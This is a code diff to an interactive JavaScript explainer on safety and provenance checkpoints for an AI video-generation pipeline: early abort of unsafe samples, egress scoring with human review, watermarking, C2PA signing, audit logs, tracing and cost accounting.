           ctx.text(tx0, ty + 20, 't = 1 (noise)', { size: 11, font: 'mono', color: 'dim', parent: g1 });
           ctx.text(tx1, ty + 20, 't = 0', { size: 11, font: 'mono', color: 'dim', anchor: 'end', parent: g1 });
@@ -600,14 +664,14 @@
           ctx.line(gx - 6, tauY, gx + 28, tauY, { color: 'pink', sw: 2, parent: g1 });
           ctx.text(gx + 34, tauY, 'τ = 0.5', { size: 12, font: 'mono', color: 'pink', parent: g1 });
           ctx.text(gx - 6, 804, 'p(unsafe)', { size: 12, font: 'mono', color: 'dim', parent: g1 });
-          var stepT = ctx.text(1000, 590, 'step 0/40', { size: 14, font: 'mono', color: 'lime', parent: g1 });
+          var stepT = ctx.text(1000, 590, 'step 0/50', { size: 14, font: 'mono', color: 'lime', parent: g1 });
           var scT = ctx.text(1000, 614, 'p = —', { size: 13, font: 'mono', color: 'text', parent: g1 });
           ctx.text(840, 845, 'x₀ estimate = x_t − t · v_θ(x_t, t, c)', { size: 16, font: 'mono', color: 'amber', anchor: 'middle', parent: g1 });
           /* beat 3 material: the abort marker */
           var g3 = ctx.group({ parent: g, opacity: 0 });
-          var ax = tx0 + (tx1 - tx0) * 12 / 40;
+          var ax = tx0 + (tx1 - tx0) * 15 / 50;
           ctx.line(ax, ty - 16, ax, ty + 12, { color: 'red', sw: 2, dash: '3 3', parent: g3 });
-          ctx.text(ax + 8, ty - 22, 'unsafe sample aborts @12/40', { size: 11, font: 'mono', color: 'red', parent: g3 });
+          ctx.text(ax + 8, ty - 22, 'unsafe sample aborts @15/50', { size: 11, font: 'mono', color: 'red', parent: g3 });
           /* beat 4 material: early-abort economics */
           var ea = ctx.group({ parent: g, opacity: 0 });
           panelRect(ctx, ea, 1180, 540, 380, 300, 'red');
@@ -616,18 +680,18 @@
           ctx.rect(1200, 624, 300, 20, { rx: 3, fill: ctx.alpha('red', 0.35), stroke: 'red', sw: 1, parent: ea });
           ctx.text(1508, 634, '760 s', { size: 12, font: 'mono', color: 'text', parent: ea });
           var b2 = ctx.rect(1200, 654, 0, 20, { rx: 3, fill: ctx.alpha('lime', 0.45), stroke: 'lime', sw: 1, parent: ea });
-          ctx.text(1298, 664, '228 s  (abort @12)', { size: 12, font: 'mono', color: 'text', parent: ea });
+          ctx.text(1298, 664, '228 s  (abort @15)', { size: 12, font: 'mono', color: 'text', parent: ea });
           ctx.para(1200, 708, ['saved = ρ · (1 − k/N)', 'preview cost ≈ 1% of sampling', 'τ calibrated per step index:', 'early x₀ estimate is a blurry mean'], { size: 13, font: 'mono', color: 'text', lh: 26, parent: ea });
           var SAFE = [0.07, 0.06, 0.06, 0.05, 0.04, 0.04, 0.03, 0.03, 0.02, 0.02];
           var UNSAFE = [0.09, 0.24, 0.74];
           /* one frame of the sampling loop: step index kk of a safe or an unsafe sample */
           function frame(kk, unsafe) {
-            cur.setAttribute('cx', tx0 + (tx1 - tx0) * kk / 40);
-            stepT.textContent = 'step ' + kk + '/40';
-            var q = Math.floor(kk / 4);
-            if (kk < 4) return;
+            cur.setAttribute('cx', tx0 + (tx1 - tx0) * kk / 50);
+            stepT.textContent = 'step ' + kk + '/50';
+            var q = Math.floor(kk / 5);
+            if (kk < 5) return;
             var s = (unsafe ? UNSAFE : SAFE)[q - 1];
-            var w = Math.pow(kk / 40, 0.8);
+            var w = Math.pow(kk / 50, 0.8);
             PV.set(function (r, c) { return ctx.mix(noise[r][c], unsafe ? hazardScene(r, c) : foxScene(r, c), w); });
             var hh = Math.max(2, gh * s);
             gFill.setAttribute('height', hh);
@@ -638,7 +702,7 @@
           }
           function reset() {
             cur.setAttribute('cx', tx0); cur.setAttribute('fill', C.lime);
-            stepT.textContent = 'step 0/40'; stepT.setAttribute('fill', C.lime);
+            stepT.textContent = 'step 0/50'; stepT.setAttribute('fill', C.lime);
             scT.textContent = 'p = —'; scT.setAttribute('fill', C.text);
             gFill.setAttribute('height', 2); gFill.setAttribute('y', gy0 + gh - 2); gFill.setAttribute('fill', ctx.alpha('lime', 0.8));
             PV.set(function (r, c) { return noise[r][c]; });
@@ -648,9 +712,33 @@
             return ctx.tween(ms, function (t) {
               var kk = Math.round(t * kmax);
               frame(kk, unsafe);
-              var q = Math.floor(kk / 4);
-              if (q !== last && kk >= 4) { last = q; ctx.pulse(PV, { color: unsafe ? 'red' : 'pink', dur: 400 }); }
+              var q = Math.floor(kk / 5);
+              if (q !== last && kk >= 5) { last = q; ctx.pulse(PV, { color: unsafe ? 'red' : 'pink', dur: 400 }); }
             }, 'linear');
+          }
+          /* TRY IT: click the timeline to scrub, click the preview to flip between a safe and an unsafe sample */
+          var scrub = { k: 50, unsafe: false };
+          function show(kk, unsafe) {
+            kk = Math.max(0, Math.min(unsafe ? 15 : 50, kk));
+            scrub.k = kk; scrub.unsafe = unsafe;
+            reset();
+            frame(kk, unsafe);
+            if (unsafe && kk >= 15) { cur.setAttribute('fill', C.red); stepT.setAttribute('fill', C.red); }
+            ctx.hud(unsafe ? 'unsafe sample · click to scrub or flip' : 'safe sample · click to scrub or flip');
+          }
+          function arm() {
+            var th = ctx.rect(tx0 - 10, ty - 18, tx1 - tx0 + 20, 40, { fill: 'rgba(0,0,0,0)', parent: g1 });
+            var ph = ctx.rect(600, 560, 16 * 19, 12 * 19, { fill: 'rgba(0,0,0,0)', parent: g1 });
+            th.style.cursor = 'pointer'; ph.style.cursor = 'pointer';
+            th.addEventListener('click', function (ev) {
+              var m = th.getScreenCTM();
+              if (!m) return;
+              var p = th.ownerSVGElement.createSVGPoint();
+              p.x = ev.clientX; p.y = ev.clientY;
+              p = p.matrixTransform(m.inverse());
+              show(Math.round((p.x - tx0) / (tx1 - tx0) * 50), scrub.unsafe);
+            });
+            ph.addEventListener('click', function () { show(scrub.k, !scrub.unsafe); });
           }
           ctx.hud('3 depths: weights · conditioning · sampling');
           /* beat 0: conditioning and the controls that act before sampling */
@@ -658,21 +746,23 @@
             return ctx.beat(1);
           }).then(function () {
             /* beat 1: the sampling timeline and the free x0 estimate */
-            ctx.hud('a preview every 4 steps · x0 estimate is free');
+            ctx.hud('a preview every 5 steps · x0 estimate is free');
             return ctx.reveal(g1, { from: 'up' }).then(function () { return ctx.pulse(PV, { color: 'amber', dur: 600 }); });
           }).then(function () {
             return ctx.beat(2);
           }).then(function () {
-            /* beat 2: a safe sample converges */
+            /* beat 2: a safe sample converges, and the timeline becomes clickable */
             reset();
-            return sample(40, 3200, false).then(function () { ctx.hud('safe shot: p stays under τ at all 10 checks'); });
+            arm();
+            return sample(50, 3200, false).then(function () { scrub.k = 50; scrub.unsafe = false; ctx.hud('safe shot: p stays under τ at all 10 checks'); });
           }).then(function () {
             return ctx.beat(3);
           }).then(function () {
-            /* beat 3: an unsafe sample is aborted at step 12 */
+            /* beat 3: an unsafe sample is aborted at step 15 */
             reset();
-            ctx.hud('unsafe sample: aborted at step 12 of 40');
-            return sample(12, 1800, true).then(function () {
+            ctx.hud('unsafe sample: aborted at step 15 of 50');
+            return sample(15, 1800, true).then(function () {
+              scrub.k = 15; scrub.unsafe = true;
               cur.setAttribute('fill', C.red); stepT.setAttribute('fill', C.red);
               return ctx.reveal(g3, { from: 'down' });
             }).then(function () { return ctx.pulse(gFill, { color: 'red', times: 2, dur: 500 }); });
@@ -680,7 +770,7 @@
             return ctx.beat(4);
           }).then(function () {
             /* beat 4: what the abort saves */
-            ctx.hud('abort @12: 228 of 760 GPU-s · saves 70%');
+            ctx.hud('abort @15: 228 of 760 GPU-s · saves 70%');
             return Promise.all([ctx.reveal(ea, { from: 'right' }), ctx.animate(b2, { width: [0, 90] }, 900, 'out', 300)]);
           });
         }
@@ -698,7 +788,7 @@
           {
             say: 'So we sample one frame per second plus the first frame of every shot, thirty six in all, and score each one. Shot boundaries are added because a shot can be shorter than the sampling period.',
             card: { tag: 'NUMBERS', title: 'Sample five percent of frames', stat: { v: '36', u: 'frames', l: '30 uniform samples plus 6 shot keyframes: about 0.4 s of GPU instead of 7 s' } },
-            deep: '<p>Frame sampling trades recall for cost: 36 of 720 frames (5%) at ~10 ms is ≈ 0.4 s. Uniform sampling at 1 Hz catches a harmful flash of duration d with probability d (a 0.5 s flash is missed half the time), which is why keyframes at shot boundaries and adaptive densification around high-scoring frames matter.</p>' +
+            deep: '<p>Frame sampling trades recall for cost: 36 of 720 frames (5%) at ~10 ms is ≈ 0.4 s. Uniform sampling at 1 Hz catches a harmful flash of duration d ≤ 1 s with probability d (a 0.5 s flash is missed half the time), which is why keyframes at shot boundaries and adaptive densification around high-scoring frames matter.</p>' +
               '<p>The plot shows the per-frame score s<sub>t</sub>, the maximum over categories. The bump near 11.6 s is the crash impact in shot 3.</p>'
           },
           {
@@ -718,7 +808,7 @@
               '<p>Top-k mean with k = 3 requires the peak to persist over several samples, so a single noisy frame cannot block a clip. Add temporal smoothing and calibrate the threshold per clip length.</p>'
           },
           {
-            say: 'Egress is the last automatic gate before signing. Scores between a review threshold and the block threshold do not hard block; they route the clip to a human reviewer.',
+            say: 'Egress is the last automatic gate before signing. Scores between a review threshold and the block threshold do not hard block. They route the clip to a human reviewer.',
             card: { tag: 'TRADE-OFF', title: 'Two thresholds, three outcomes', body: 'Pass below the review threshold, human review inside the band, block only above the hard threshold. Size the band by reviewer capacity.' },
             deep: '<p>With τ<sub>review</sub> &lt; τ<sub>block</sub>, the middle band trades reviewer time for fewer false blocks. Capacity check: 100,000 trailers a day with 0.5% in the band is 500 reviews; at 90 s each that is 12.5 reviewer-hours per day.</p>' +
               '<p>Reviewer labels flow back as training data (active learning) and as threshold-calibration data. Borderline is also where policy ambiguity lives, so disagreement between reviewers is itself a signal to fix the written policy.</p>'
@@ -842,7 +932,7 @@
         beats: [
           {
             say: 'The fifth checkpoint makes the output accountable. An invisible watermark is woven into every frame, carrying a forty eight bit payload.',
-            card: { tag: 'HOW IT WORKS', title: 'A residual the eye cannot see', body: 'A learned encoder adds a tiny residual to each frame, around 42 dB PSNR, that a matching decoder reads back as a 48 bit payload.' },
+            card: { tag: 'HOW IT WORKS', title: 'A residual the eye cannot see', body: 'A learned encoder adds a tiny residual to each frame (here about 42 dB PSNR) that a matching decoder reads back as a 48 bit payload.' },
             deep: '<p>Encoder E and decoder D are trained jointly with a differentiable attack layer A (JPEG and H.264 proxies, crops, resizes, colour jitter):</p>' +
               '<div class="eq">min<sub>E,D</sub> 𝔼<sub>x,m,A</sub> [ BCE(D(A(E(x,m))), m) + λ · LPIPS(E(x,m), x) ]</div>' +
               '<p>The BCE term forces the payload m to survive; the LPIPS term keeps the residual invisible. For video the mark is embedded in every frame and detection pools evidence across frames.</p>'
@@ -857,7 +947,7 @@
           {
             say: 'A C2PA manifest is attached to the file, declaring that the video was created by a generative model from three ingredient sketches, hashed to the exact bytes and signed with a certificate chain.',
             card: { tag: 'HOW IT WORKS', title: 'A signed statement about the file', body: 'Actions, ingredients and a hard binding to the file bytes, wrapped in a claim and signed with COSE. Anyone can verify it against a trust list.' },
-            deep: '<p>The manifest is a JUMBF box store carried in an MP4 <code>uuid</code> box. <b>Assertions</b> say what happened: <code>c2pa.actions.v2</code> with <code>digitalSourceType = trainedAlgorithmicMedia</code>, one <code>c2pa.ingredient</code> per sketch, and <code>c2pa.hash.bmff.v3</code> binding the file boxes.</p>' +
+            deep: '<p>The manifest is a JUMBF box store carried in an MP4 <code>uuid</code> box. <b>Assertions</b> say what happened: <code>c2pa.actions.v2</code> with <code>digitalSourceType = trainedAlgorithmicMedia</code>, one <code>c2pa.ingredient.v3</code> per sketch, and <code>c2pa.hash.bmff.v3</code> binding the file boxes.</p>' +
               '<p>The <b>claim</b> lists hashed URIs of the assertions and the generator. The <b>signature</b> is COSE_Sign1 (ES256) with an <code>x5chain</code> to a CA on the C2PA trust list and an RFC 3161 timestamp, so it still verifies after the certificate expires.</p>'
           },
           {
@@ -865,7 +955,8 @@
             card: { tag: 'KEY IDEA', title: 'Tamper-evident by chaining', body: 'Each entry hashes its predecessor, so editing any past record changes every later hash. Publishing the head hash makes the log tamper-evident.' },
             deep: '<div class="eq">h<sub>i</sub> = SHA-256( h<sub>i−1</sub> ‖ e<sub>i</sub> )</div>' +
               '<p>Periodically signing or publishing the head hash to WORM storage means an editor must rewrite everything after the change <i>and</i> the published head. Certificate Transparency uses the same idea with Merkle trees for efficient inclusion proofs.</p>' +
-              '<p>Events carry policy and model versions, enabling <b>replay</b>: would today\'s policy have blocked last month\'s job? Store references, not raw content, so personal data can be deleted without breaking the chain.</p>'
+              '<p>Events carry policy and model versions, enabling <b>replay</b>: would today\'s policy have blocked last month\'s job? Store references, not raw content, so personal data can be deleted without breaking the chain.</p>' +
+              '<details><summary>Go deeper</summary><p>A plain chain forces a verifier to replay every entry. A Merkle tree over n entries proves that entry i is in the log with ⌈log<sub>2</sub> n⌉ sibling hashes, about 30 hashes (≈ 1 KB) for a billion entries, and a consistency proof shows the log only grew by appends. Certificate Transparency (RFC 6962, since superseded by RFC 9162) works this way.</p></details>'
           },
           {
             say: 'The two halves protect each other. Metadata is stripped by most re-uploads, so the watermark identifier lets a verifier fetch the manifest from a repository. And where a watermark is erased, an intact signed manifest still proves origin.',
@@ -914,7 +1005,7 @@
             ' assertions',
             '  c2pa.actions.v2   c2pa.created',
             '    digitalSourceType: trainedAlgorithmicMedia',
-            '  c2pa.ingredient ×3  sketch_1..3.png',
+            '  c2pa.ingredient.v3 ×3  sketch_1..3.png',
             '  c2pa.hash.bmff.v3   (binds MP4 bytes)',
             '  c2pa.soft-binding   wm:9c41…',
             ' signature  COSE_Sign1 · ES256',
@@ -1015,7 +1106,7 @@
           {
             say: 'So the critic sends it back. The redo edge returns shot three to the generator, and the retry lifts the identity score to four. A retry cap bounds the cost of a picky critic.',
             card: { tag: 'NUMBERS', title: 'One redo, bounded cost', stat: { v: '+30 s', u: '≈ 4 GPU-min', l: 'for one re-render of shot 3 on 8 GPUs; retries are capped at two' } },
-            deep: '<p>The defect is localised in time (3.1–3.6 s), so the retry regenerates only the affected window with the same seed and a tighter identity reference: about 30 s on 8 GPUs (240 GPU-seconds) instead of a full 95 s shot.</p>' +
+            deep: '<p>The defect is localised in time (3.1–3.6 s), so the retry regenerates only a window of about 1.5 s around it, with the neighbouring latent frames frozen as context and a tighter identity reference. That is roughly a third of the sequence: about 30 s on 8 GPUs (240 GPU-seconds) instead of a full 95 s shot.</p>' +
               '<p>The retry cap and the GPU budget bound the cost of a picky critic. Redo rate is itself a metric: a jump after a model upgrade means the generator regressed or the judge drifted, and only the calibration set can tell which.</p>'
           },
           {
@@ -1031,7 +1122,7 @@
           var g = bench(ctx, 'EVALUATION · three loops, three time scales', 'teal');
           S.evo.setAttribute('filter', 'url(#fx-glow)');
           /* critic back-edge on the obs row (hidden until beat 2) */
-          var be = ctx.path('M' + SX[3] + ',426 Q' + (SX[2] + SX[3]) / 2 + ',448 ' + SX[2] + ',426', { stroke: 'magenta', sw: 1.8, arrow: true, parent: S.map, opacity: 0 });
+          var be = ctx.path('M' + SX[2] + ',426 Q' + (SX[2] + SX[3]) / 2 + ',448 ' + SX[3] + ',426', { stroke: 'magenta', sw: 1.8, arrow: true, parent: S.map, opacity: 0 });
           var beL = ctx.label((SX[2] + SX[3]) / 2, 390, 'critic → redo shot 3', { color: 'magenta', size: 11, parent: S.map, opacity: 0 });
           /* concentric loops */
           var cx = 250, cy = 690;
@@ -1060,7 +1151,7 @@
           var js = ctx.code({ x: 1295, y: 500, w: 265, title: 'critic · shot 3', lang: 'json', size: 12, typing: true, parent: g1, lines: [
             '{"adherence": 4,',
             ' "identity": 2,',
-            ' "physics": 3,',
+            ' "physics": 4,',
             ' "artefact": "visor',
             '    flicker 3.1-3.6 s",',
             ' "verdict": "redo"}'
@@ -1119,32 +1210,32 @@
             say: 'Finally, observability. One trace identifier is minted at the gateway and propagated in a traceparent header through every agent turn, model call and GPU job, so the whole trailer becomes one tree of spans.',
             card: { tag: 'HOW IT WORKS', title: 'One id follows the job', body: 'The traceparent header carries a 128 bit trace id and a 64 bit parent span id. Queues carry it as a message attribute, so GPU jobs join the same tree.' },
             deep: '<p><b>Traces</b> (Dapper, then OpenTelemetry): a trace is a tree of spans sharing a 128-bit <code>trace_id</code>. Context crosses process boundaries in the W3C header <code>traceparent: 00-&lt;trace-id&gt;-&lt;parent-span-id&gt;-&lt;flags&gt;</code>, and through queues as message attributes, so a GPU job that starts minutes later still joins the right trace.</p>' +
-              '<p>GenAI spans (<code>invoke_agent</code>, <code>chat</code>, <code>execute_tool</code>) carry <code>gen_ai.request.model</code> and token counts; cache-read tokens, GPU-seconds and queue wait are custom attributes. Span links join fan-out and fan-in, such as six shot spans feeding one edit span.</p>'
+              '<p>GenAI spans (<code>invoke_agent</code>, <code>chat</code>, <code>execute_tool</code>) carry <code>gen_ai.request.model</code> and token counts, including cache-read tokens (<code>gen_ai.usage.cache_read.input_tokens</code>); GPU-seconds, queue wait and cost are custom <code>app.*</code> attributes. The GenAI conventions are still marked Development, so pin a version. Span links join fan-out and fan-in, such as six shot spans feeding one edit span.</p>'
           },
           {
             say: 'Drawn as a waterfall, the tree shows where the one hundred fifty one seconds went. Diffusion and the retry sit on the critical path, while narration and reference encoding run in the shadows.',
             card: { tag: 'NUMBERS', title: 'Where 151 seconds went', stat: { v: '83%', l: 'of wall clock is DiT sampling plus the retry: 125 of 151 s, 212 spans in one trace' } },
-            deep: '<p>The <b>critical path</b> is the chain of spans that determines end-to-end latency: plan, storyboard, DiT (including queue wait), critic, retry, edit and sign. Reference encoding and narration run in parallel with slack, so optimising them saves nothing.</p>' +
+            deep: '<p>The <b>critical path</b> is the chain of spans that determines end-to-end latency: plan, storyboard, DiT (including queue wait), critic, retry, edit and sign. Reference encoding and narration run in parallel with slack, so optimising them saves nothing. Removing the 30 s retry would cut the job by 20 percent; halving DiT sampling would cut about 48 s, or 31 percent.</p>' +
               '<p><b>Sampling</b>: keep 1–10% of traces by head sampling, and keep <i>every</i> trace that errored, retried or breached an SLO by tail sampling in the collector. This trace is kept because it contains a retry.</p>'
           },
           {
             say: 'Metrics watch the fleet: time to first token, queue wait on the video pool, and utilization. GPU utilization looks like ninety percent while model FLOPs utilization is closer to forty.',
             card: { tag: 'PITFALL', title: 'Busy is not efficient', body: 'The GPU utilization counter only says a kernel was running. Model FLOPs utilization, achieved over peak, is the number that reveals waste.' },
             deep: '<div class="eq">MFU = achieved model FLOP/s ÷ peak (≈ 989 TFLOP/s dense BF16, H100 SXM)</div>' +
-              '<p>DiT sampling is compute-bound, so MFU of 35–55% is normal; here it is 43%. LLM decode is bandwidth-bound and low MFU is expected, so watch tokens per second per GPU instead. Track SM occupancy, HBM bandwidth and NVLink utilisation through DCGM exporters.</p>' +
+              '<p>DiT sampling is compute-bound, so a well-tuned run can plausibly reach 35–55% (Llama 3 pre-training reported 38–43% BF16 MFU on H100s); here it is 43%, counted on the FLOPs the production sampler actually runs (guidance-distilled and step-cached, about 3.2×10¹⁷ FLOP per shot: 3.2×10¹⁷ ÷ (8 × 989 TFLOP/s × 0.43) ≈ 95 s). LLM decode is bandwidth-bound and low MFU is expected, so watch tokens per second per GPU instead. Track SM occupancy, HBM bandwidth and NVLink utilisation through DCGM exporters.</p>' +
               '<p>The p99 TTFT spike in the chart is a prefill burst from 40 parallel agent turns arriving together.</p>'
           },
           {
-            say: 'And every span carries its cost. This trailer consumed about eighty GPU minutes and a few hundred thousand tokens, roughly nine dollars per finished minute of video.',
-            card: { tag: 'NUMBERS', title: 'Nine dollars a minute', stat: { v: '≈ $9', u: '/ min', l: 'of finished video: $4.61 per 30 s trailer, 69 percent of it diffusion sampling' },
-              more: '<p>4,800 GPU-seconds (6 × 8 × 95 s of sampling plus 8 × 30 s of retry) is 80 GPU-minutes; at $2.5 per H100-hour that is $3.33. Add LLM tokens ($1.10 at cached and uncached prices) and audio, safety and CDN ($0.17) to reach $4.61, then double it for a full minute.</p>' },
+            say: 'And every span carries its cost. This trailer consumed about eighty three GPU minutes and a few hundred thousand tokens, roughly eight dollars per finished minute of video.',
+            card: { tag: 'NUMBERS', title: 'Eight dollars a minute', stat: { v: '≈ $8', u: '/ min', l: 'of finished video: $4.07 per 30 s trailer, 78 percent of it diffusion sampling' },
+              more: '<p>4,800 GPU-seconds (6 × 8 × 95 s of sampling plus 8 × 30 s of retry) is 80 GPU-minutes; at $2.5 per H100-hour that is $3.33. Add LLM tokens ($0.59: 190k in, 60 percent cached, plus 22k out) and reference encoding, voice and edit (200 GPU-seconds, $0.14) to reach $4.07 after rounding the line items, then double it for a full minute.</p>' },
             deep: '<table><tr><th>Item</th><th>Basis</th><th>$</th></tr>' +
               '<tr><td>DiT shots</td><td>6 × 8 GPU × 95 s</td><td>3.17</td></tr>' +
               '<tr><td>Re-render</td><td>8 GPU × 30 s</td><td>0.17</td></tr>' +
-              '<tr><td>LLM tokens</td><td>0.45M in (70% cached), 40k out</td><td>1.10</td></tr>' +
-              '<tr><td>Audio, safety, CDN</td><td>TTS, encoders, encode</td><td>0.17</td></tr>' +
-              '<tr><td><b>Total</b></td><td>per 30 s trailer</td><td><b>4.61</b></td></tr></table>' +
-              '<p>That is ≈ $9.2 per finished minute. Cost is an attribute on every span (<code>app.cost_usd</code>, <code>app.gpu_seconds</code>), so it rolls up per job, per agent and per customer. Illustrative pricing: H100 ≈ $2.5 per GPU-hour.</p>'
+              '<tr><td>LLM tokens</td><td>190k in (60% cached), 22k out</td><td>0.59</td></tr>' +
+              '<tr><td>Refs, voice, edit</td><td>encoders, TTS, encode</td><td>0.14</td></tr>' +
+              '<tr><td><b>Total</b></td><td>per 30 s trailer</td><td><b>4.07</b></td></tr></table>' +
+              '<p>That is ≈ $8.1 per finished minute. Cost is an attribute on every span (<code>app.cost_usd</code>, <code>app.gpu_seconds</code>), so it rolls up per job, per agent and per customer. Illustrative pricing: H100 ≈ $2.5 per GPU-hour.</p>'
           }
         ],
         run: function (ctx) {
@@ -1191,7 +1282,7 @@
           var cg = ctx.group({ parent: g, opacity: 0 });
           panelRect(ctx, cg, 1180, 496, 380, 366, 'teal');
           ctx.text(1200, 522, 'COST PER JOB', { size: 13, font: 'display', weight: 700, color: 'teal', spacing: 1, parent: cg });
-          var COST = [['DiT shots', 3.17, 'lime'], ['LLM tokens', 1.10, 'amber'], ['re-render', 0.17, 'red'], ['audio · safety · CDN', 0.17, 'orange']];
+          var COST = [['DiT shots', 3.17, 'lime'], ['LLM tokens', 0.59, 'amber'], ['re-render', 0.17, 'red'], ['refs · voice · edit', 0.14, 'orange']];
           var tot = COST.reduce(function (a, c) { return a + c[1]; }, 0);
           var sx = 1200, swd = 340, acc = 0;
           var segs = COST.map(function (c, i) {
@@ -1207,7 +1298,7 @@
           var totT = ctx.text(sx + swd, 742, '$0.00', { size: 16, font: 'mono', weight: 700, color: 'white', anchor: 'end', parent: cg });
           ctx.text(sx, 782, '$ / finished video minute', { size: 13, font: 'mono', color: 'dim', parent: cg });
           var perMin = ctx.text(sx + swd, 782, '$0.00', { size: 20, font: 'mono', weight: 700, color: 'teal', anchor: 'end', parent: cg });
-          ctx.text(sx, 822, '80 GPU-min · 0.49M tokens', { size: 12, font: 'mono', color: 'dim', parent: cg });
+          ctx.text(sx, 822, '83 GPU-min · 0.21M tokens', { size: 12, font: 'mono', color: 'dim', parent: cg });
           ctx.text(sx, 844, 'H100 ≈ $2.5/GPU-h (illustrative)', { size: 11, font: 'mono', color: 'dim', parent: cg });
           ctx.reveal(tp, { from: 'left' });
           ctx.hud('trace 4bf92f35… · 1 tree · 212 spans');
@@ -1256,7 +1347,7 @@
               '<tr><td>Provenance</td><td>~1 s</td><td>metadata stripped on re-upload</td></tr></table>'
           },
           {
-            say: 'They add a few percent of GPU cost, mostly from generation-time previews and egress scoring. Evaluation and tracing run asynchronously, off the critical path.',
+            say: 'They add a few percent of GPU cost: about one percent each from generation-time previews and from evaluation and tracing, and under half a percent from egress scoring. Evaluation and tracing run asynchronously, off the critical path.',
             card: { tag: 'NUMBERS', title: 'A few percent of GPU', stat: { v: '≈ 3%', l: 'of GPU cost: previews ~1%, egress under 0.5%, evals and traces ~1%' },
               more: '<p>Ingress under 0.1%, provenance under 0.2%, egress under 0.5%, gen-time previews ~1%, evals and traces ~1%: about 3% in total. The policy engine is CPU-only and effectively free.</p>' },
             deep: '<p>Cost shares by checkpoint, relative to total GPU spend: ingress &lt;0.1%, policy ~0, generation-time ~1% (previews on every sample), egress &lt;0.5% (36 frames, a temporal window, ASR), provenance &lt;0.2%, evals and traces ~1%.</p>' +
@@ -1311,7 +1402,7 @@
           var HB = [['versioned policies + models', 'every decision replayable', 'lime', 'layers'], ['calibrated thresholds', 'recheck as base rates drift', 'amber', 'chart'],
             ['human review queues', 'the uncertain band, labels fed back', 'violet', 'user'], ['red-team regression', 'every attack becomes a test', 'red', 'bolt']];
           var hn = HB.map(function (h, i) {
-            return ctx.node({ x: 260 + (i % 2) * 520, y: 590 + Math.floor(i / 2) * 110, w: 480, h: 76, title: h[0], sub: h[1], icon: h[3], color: h[2], titleSize: 16, subSize: 12, parent: hab });
+            return ctx.node({ x: 310 + (i % 2) * 520, y: 590 + Math.floor(i / 2) * 110, w: 480, h: 76, title: h[0], sub: h[1], icon: h[3], color: h[2], titleSize: 16, subSize: 12, parent: hab });
           });
           /* beat 3 material: zoom-in card */
           var zg = ctx.group({ parent: g, opacity: 0 });
@@ -1322,21 +1413,34 @@
           ctx.text(1460, 810, 'click the lane headers', { size: 11, font: 'mono', color: 'dim', anchor: 'middle', parent: zg });
           for (var i = 1; i <= 5; i++) lightCP(ctx, i);
           ctx.hud('trust ≈ 3 s of 151 s · ≈ 2% of wall-clock');
-          var hl = ctx.rect(510, 500, 340, 290, { rx: 10, stroke: 'amber', sw: 1.6, dash: '6 5', parent: g, opacity: 0 });
+          var hl = ctx.rect(686, 500, 96, 290, { rx: 10, stroke: 'amber', sw: 1.6, dash: '6 5', parent: g, opacity: 0 });
+          /* beat 1 material: share of GPU cost per checkpoint, drawn as bars beside the table */
+          var shg = ctx.group({ parent: g, opacity: 0 });
+          ctx.text(1200, 516, 'share of GPU cost · Σ ≈ 3%', { size: 12, font: 'mono', color: 'dim', spacing: 1, parent: shg });
+          var SHARE = [0.1, 0.02, 1, 0.5, 0.2, 1];
+          var shb = SHARE.map(function (v, i) {
+            var col = i < 5 ? 'pink' : 'teal';
+            var b = ctx.rect(1200, 560 + i * 44 - 7, 0, 14, { rx: 3, fill: ctx.alpha(col, 0.6), stroke: col, sw: 1, parent: shg });
+            b.w = Math.max(3, v * 110);
+            return b;
+          });
           /* beat 0: the six rows and the trust slices on the critical path */
           return Promise.all([ctx.reveal(rows, { from: 'left', stagger: 120 }), ctx.reveal(cp, { delay: 700 }), ctx.reveal(sl, { from: 'scale', delay: 900, stagger: 60 })]).then(function () {
             return ctx.beat(1);
           }).then(function () {
             /* beat 1: the cost columns */
             ctx.hud('trust ≈ 3% of GPU cost · evals async');
-            return ctx.reveal(hl, { from: 'scale', dur: 500 }).then(function () { return ctx.pulse(hl, { color: 'amber', times: 2, dur: 600 }); });
+            return Promise.all([ctx.reveal(hl, { from: 'scale', dur: 500 }), ctx.reveal(shg, { from: 'left', dur: 500 })]).then(function () {
+              return Promise.all(shb.map(function (b, i) { return ctx.tween(600, function (t) { b.setAttribute('width', b.w * t); }, 'out', i * 90); }));
+            }).then(function () { return ctx.pulse(hl, { color: 'amber', times: 2, dur: 600 }); });
           }).then(function () {
             return ctx.beat(2);
           }).then(function () {
             /* beat 2: the habits that keep it working */
             ctx.hud('');
-            ctx.fade(tb, 0.1, 500);
+            ctx.fade(tb, 0.05, 500);
             ctx.fade(hl, 0, 500);
+            ctx.fade(shg, 0, 500);
             return ctx.reveal(hab, { from: 'up' }).then(function () { return Promise.all(hn.map(function (n) { return ctx.pulse(n, { color: n.color, dur: 500 }); })); });
           }).then(function () {
             return ctx.beat(3);
